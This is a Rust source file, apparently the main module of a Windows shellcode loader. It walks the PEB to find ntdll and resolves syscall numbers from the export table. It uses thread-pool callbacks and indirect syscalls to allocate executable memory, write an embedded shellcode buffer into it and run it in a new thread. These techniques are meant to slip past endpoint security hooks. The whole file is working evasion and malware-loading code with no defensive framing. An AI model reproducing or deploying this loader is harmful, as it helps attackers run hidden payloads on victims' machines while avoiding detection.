
use std::{ptr, slice};
use std::arch::asm;
use std::ffi::{CStr, CString};
use std::intrinsics::transmute;
use std::ptr::null_mut;

use ntapi::ntldr::PLDR_DATA_TABLE_ENTRY;
use ntapi::ntpebteb::PEB;
use ntapi::ntpsapi::PEB_LDR_DATA;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{FARPROC, HMODULE};
use winapi::shared::ntdef::{LIST_ENTRY, NULL, PVOID};
use winapi::um::libloaderapi::GetProcAddress;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{
    GENERIC_EXECUTE, HANDLE, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER,
    IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PTP_WORK, PTP_WORK_CALLBACK,
};

use crate::shellcode::SHELLCODE;
use crate::types::{
    DWORD, get_ssn_by_func_address, nt_allocate_virtual_memory_callback,
    nt_create_thread_ex_callback, nt_write_virtual_memory_callback, NTAllocateVirtualMemoryArgs,
    NtCreateThreadExArgs, NtWriteVirtualMemoryArgs, PTpAllocWork, PTpPostWork,
    PTpReleaseWork, search_for_add_rsp, search_for_syscall,
};

mod shellcode;
mod types;

#[no_mangle]
static mut SYSCALL_ADDRESS: usize = 0;
#[no_mangle]
static mut ADD_RSP_RET: usize = 0;
static mut TP_ALLOC_WORK: FARPROC = ptr::null_mut();
static mut TP_POST_WORK: FARPROC = ptr::null_mut();
static mut TP_RELEASE_WORK: FARPROC = ptr::null_mut();
static mut NTALLOCATE_VIRTUAL_MEMORY_ARGS: NTAllocateVirtualMemoryArgs =
    NTAllocateVirtualMemoryArgs {
        h_process: NULL,
        address: ptr::null_mut(),
        zero_bits: 0,
        allocation_type: (MEM_RESERVE | MEM_COMMIT) as usize,
        size: ptr::null_mut(),
        permissions: PAGE_EXECUTE_READWRITE as usize,
        ssn: 0,
    };

static mut NTWRITE_VIRTUAL_MEMORY_ARGS: NtWriteVirtualMemoryArgs = NtWriteVirtualMemoryArgs {
    h_process: NULL,
    address: ptr::null_mut(),
    buffer: ptr::null_mut(),
    number_of_bytes_to_write: 0,
    number_of_bytes_written: ptr::null_mut(),
    ssn: 0,
};

static mut NT_CREATE_THREAD_EX_ARGS: NtCreateThreadExArgs = NtCreateThreadExArgs {
    thread_handle: ptr::null_mut(),
    desired_access: 0,
    object_attributes: ptr::null_mut(),
    process_handle: ptr::null_mut(),
    lp_start_address: ptr::null_mut(),
    lp_parameter: ptr::null_mut(),
    flags: 0,
    stack_zero_bits: 0,
    size_of_stack_commit: 0,
    size_of_stack_reserve: 0,
    lp_bytes_buffer: ptr::null_mut(),
    ssn: 0,
};
#[inline]
#[cfg(target_pointer_width = "64")]
pub unsafe fn __readgsqword(offset: types::DWORD) -> types::DWORD64 {
    let out: u64;
    asm!(
    "mov {}, gs:[{:e}]",
    lateout(reg) out,
    in(reg) offset,
    options(nostack, pure, readonly),
    );
    out
}
#[inline]
#[cfg(target_pointer_width = "32")]
pub unsafe fn __readfsdword(offset: u32) -> u32 {
    let out: u32;
    asm!(
    "mov {}, fs:[{}]",
    lateout(reg) out,
    in(reg) offset,
    options(nostack, pure, readonly),
    );
    out
}

unsafe fn get_ntdll_module() -> usize {
    #[cfg(target_pointer_width = "64")]
    let peb = __readgsqword(0x60);

    #[cfg(target_pointer_width = "32")]
    let peb = __readfsdword(0x30) as u64;
    let peb_ldr_data = (*(peb as *mut PEB)).Ldr;
    let ldr_data = *(peb_ldr_data as *mut PEB_LDR_DATA);
    let mut list_entry: *mut LIST_ENTRY = (*ldr_data.InMemoryOrderModuleList.Flink).Flink;
    let ldr_entry = (list_entry as usize - 16) as PLDR_DATA_TABLE_ENTRY;
    (*ldr_entry).DllBase as usize
}
#[inline(never)]
unsafe fn init_variables() {
    let ntdll_module = get_ntdll_module();
    // println!("ntdll 模块句柄: {:#x}", ntdll_module);

    search_for_syscall(ntdll_module);
    // println!(
    //     "Found target bytes sequence at address {:X}!",
    //     SYSCALL_ADDRESS
    // );
    search_for_add_rsp(ntdll_module);
    // println!("Found target bytes sequence at address {:X}!", ADD_RSP_RET);

    let s_tp_alloc_work = CString::new("TpAllocWork").unwrap();
    TP_ALLOC_WORK = GetProcAddress(ntdll_module as HMODULE, s_tp_alloc_work.as_ptr());
    let s_tp_post_work = CString::new("TpPostWork").unwrap();
    TP_POST_WORK = GetProcAddress(ntdll_module as HMODULE, s_tp_post_work.as_ptr());
    let s_tp_release_work = CString::new("TpReleaseWork").unwrap();
    TP_RELEASE_WORK = GetProcAddress(ntdll_module as HMODULE, s_tp_release_work.as_ptr());
}

fn get_export_table_address(image_base: HMODULE) -> *mut IMAGE_EXPORT_DIRECTORY {
    let base_address = image_base as usize;

    let dos_header_addr = base_address;
    let dos_header: &IMAGE_DOS_HEADER = unsafe { &*(dos_header_addr as *const IMAGE_DOS_HEADER) };

    let pe_header_addr = base_address + dos_header.e_lfanew as usize;
    let nt_header: &IMAGE_NT_HEADERS = unsafe { &*(pe_header_addr as *const IMAGE_NT_HEADERS) };

    let export_dir_virtual_addr = base_address
        + nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize;

    let export_dir: *mut IMAGE_EXPORT_DIRECTORY =
        export_dir_virtual_addr as *mut IMAGE_EXPORT_DIRECTORY;
    export_dir
}

fn get_export_function_address(
    module_handle: HMODULE,
    export_dir: *const IMAGE_EXPORT_DIRECTORY,
    function_name: &str,
) -> *const u8 {
    let base_address = module_handle as usize;
    let export_dir = unsafe { &*export_dir };

    let address_of_functions =
        (base_address + export_dir.AddressOfFunctions as usize) as *const u32;
    let number_of_functions = export_dir.NumberOfFunctions;

    // let address_of_name_ordinals = (base_address + export_dir.AddressOfNameOrdinals as usize) as *const u16;
    let address_of_names = (base_address + export_dir.AddressOfNames as usize) as *const u32;

    for i in 0..number_of_functions {
        let current_function_name: *const i8 = if (i as usize) < export_dir.NumberOfNames as usize {
            (base_address + unsafe { *address_of_names.add(i as usize) } as usize) as *const i8
        } else {
            ptr::null()
        };

        let function_address =
            base_address + unsafe { *address_of_functions.add(i as usize + 1) } as usize;

        if !current_function_name.is_null() {
            let c_str = unsafe { CStr::from_ptr(current_function_name) };
            if let Ok(c_str) = c_str.to_str() {
                if c_str == function_name {
                    return function_address as *const u8;
                }
            }
        }
    }

    ptr::null()
}

unsafe fn GetSSN(functionName: &str) -> DWORD {
    //1. Get a HANDLE to the NTDLL.
    let hNtdll: usize = get_ntdll_module();

    //2. Get NTDLL's export table.
    let export_table_address = get_export_table_address(hNtdll as HMODULE);

    //3. Get the NTDLL's function address by its name.
    let function_address =
        get_export_function_address(hNtdll as HMODULE, export_table_address, functionName);

    //4. Get the Syscall number.
    let ssn = get_ssn_by_func_address(function_address as HANDLE);
    // println!("SSN value: {}", ssn);

    return ssn;
}
unsafe fn setcallback(callback: PTP_WORK_CALLBACK, args: PVOID) {
    let mut work_return: PTP_WORK = ptr::null_mut();
    // 获取所需函数地址
    let tp_alloc_work: PTpAllocWork = transmute(TP_ALLOC_WORK);
    let tp_post_work: PTpPostWork = transmute(TP_POST_WORK);
    let tp_release_work: PTpReleaseWork = transmute(TP_RELEASE_WORK);
    //进行回调
    match callback {
        Some(callback) => {
            tp_alloc_work(&work_return, transmute(callback), args, ptr::null_mut());
        }
        _ => {}
    }
    tp_post_work(work_return);
    tp_release_work(work_return);
    // sleep(Duration::from_secs(10));
    WaitForSingleObject(usize::MAX as HANDLE, 0x1000);
}
unsafe fn nt_allocate_virtual_memory(hprogress: HANDLE) -> PVOID {
    let mut allocated_address: PVOID = NULL;
    let mut allocatedsize: SIZE_T = 0x1000;

    let nt_allocate_virtual_memory_args = NTAllocateVirtualMemoryArgs {
        h_process: hprogress,
        address: &mut allocated_address,
        zero_bits: 0,
        size: &mut allocatedsize,
        allocation_type: (MEM_RESERVE | MEM_COMMIT) as usize,
        permissions: PAGE_EXECUTE_READWRITE as usize,
        ssn: GetSSN("NtAllocateVirtualMemory"),
    };
    NTALLOCATE_VIRTUAL_MEMORY_ARGS = NTAllocateVirtualMemoryArgs {
        h_process: nt_allocate_virtual_memory_args.h_process,
        address: nt_allocate_virtual_memory_args.address,
        zero_bits: nt_allocate_virtual_memory_args.zero_bits,
        size: nt_allocate_virtual_memory_args.size,
        allocation_type: nt_allocate_virtual_memory_args.allocation_type,
        permissions: nt_allocate_virtual_memory_args.permissions,
        ssn: nt_allocate_virtual_memory_args.ssn,
    };
    let callback_ptr: *const () = nt_allocate_virtual_memory_callback as *const ();

    setcallback(
        transmute(callback_ptr),
        transmute(&nt_allocate_virtual_memory_args),
    );
    return allocated_address;
}

unsafe fn nt_write_virtual_memory(
    hprogress: HANDLE,
    allocated_address: PVOID,
    bytes_written: *mut u32,
) {
    let nt_write_virtual_memory_args = NtWriteVirtualMemoryArgs {
        h_process: hprogress,
        address: allocated_address as *mut PVOID,
        buffer: SHELLCODE.as_ptr() as *const PVOID,
        number_of_bytes_to_write: SHELLCODE.len() as u32,
        number_of_bytes_written: bytes_written,
        ssn: GetSSN("NtWriteVirtualMemory"),
    };
    NTWRITE_VIRTUAL_MEMORY_ARGS = NtWriteVirtualMemoryArgs {
        h_process: nt_write_virtual_memory_args.h_process,
        address: nt_write_virtual_memory_args.address,
        buffer: nt_write_virtual_memory_args.buffer,
        number_of_bytes_to_write: nt_write_virtual_memory_args.number_of_bytes_to_write,
        number_of_bytes_written: nt_write_virtual_memory_args.number_of_bytes_written,
        ssn: nt_write_virtual_memory_args.ssn,
    };
    let callback_ptr: *const () = nt_write_virtual_memory_callback as *const ();
    setcallback(
        transmute(callback_ptr),
        transmute(&nt_write_virtual_memory_args),
    );
}

unsafe fn nt_create_thread_ex(hprogress: HANDLE, mut hthread: HANDLE, allocated_address: PVOID) {
    let nt_create_thread_ex_args = NtCreateThreadExArgs {
        thread_handle: &mut hthread,
        desired_access: GENERIC_EXECUTE,
        object_attributes: null_mut(),
        process_handle: hprogress,
        lp_start_address: allocated_address,
        lp_parameter: null_mut(),
        flags: 0,
        stack_zero_bits: 0,
        size_of_stack_commit: 0,
        size_of_stack_reserve: 0,
        lp_bytes_buffer: null_mut(),
        ssn: GetSSN("NtCreateThreadEx"),
    };
    NT_CREATE_THREAD_EX_ARGS = NtCreateThreadExArgs {
        thread_handle: nt_create_thread_ex_args.thread_handle,
        desired_access: nt_create_thread_ex_args.desired_access,
        object_attributes: nt_create_thread_ex_args.object_attributes,
        process_handle: nt_create_thread_ex_args.process_handle,
        lp_start_address: nt_create_thread_ex_args.lp_start_address,
        lp_parameter: nt_create_thread_ex_args.lp_parameter,
        flags: nt_create_thread_ex_args.flags,
        stack_zero_bits: nt_create_thread_ex_args.stack_zero_bits,
        size_of_stack_commit: nt_create_thread_ex_args.size_of_stack_commit,
        size_of_stack_reserve: nt_create_thread_ex_args.size_of_stack_reserve,
        lp_bytes_buffer: nt_create_thread_ex_args.lp_bytes_buffer,
        ssn: nt_create_thread_ex_args.ssn,
    };
    let callback_ptr: *const () = nt_create_thread_ex_callback as *const ();
    setcallback(
        transmute(callback_ptr),
        transmute(&nt_create_thread_ex_args),
    );
}

fn main() {
    unsafe {
        init_variables();

        println!("[*] Executing nt_allocate_virtual_memory...");
        let allocated_address = nt_allocate_virtual_memory(usize::MAX as HANDLE);
        println!("Allocated address: {:X}", allocated_address as usize);

        println!("[*] Executing nt_write_virtual_memory...");
        let mut writen_size: u32 = 0;
        nt_write_virtual_memory(usize::MAX as HANDLE, allocated_address, &mut writen_size);
        // // 将指针转换为字节切片
        // let bytes = unsafe { slice::from_raw_parts(allocated_address as *const u8, 276) };
        //
        // // 打印指针地址
        // println!("Pointer address: {:?}", allocated_address);
        //
        // // 打印后面的 256 个字节
        // println!("Next 256 bytes:");
        // for (i, byte) in bytes.iter().enumerate() {
        //     if i % 16 == 0 {
        //         print!("\n{:08x}: ", i);
        //     }
        //     print!("{:02x} ", byte);
        // }
        // println!();
     
        println!("[*] Executing nt_create_thread_ex...");
        nt_create_thread_ex(
            usize::MAX as HANDLE,
            null_mut(),
            allocated_address,
        );
 
        println!("Hello, world!");
    }
}
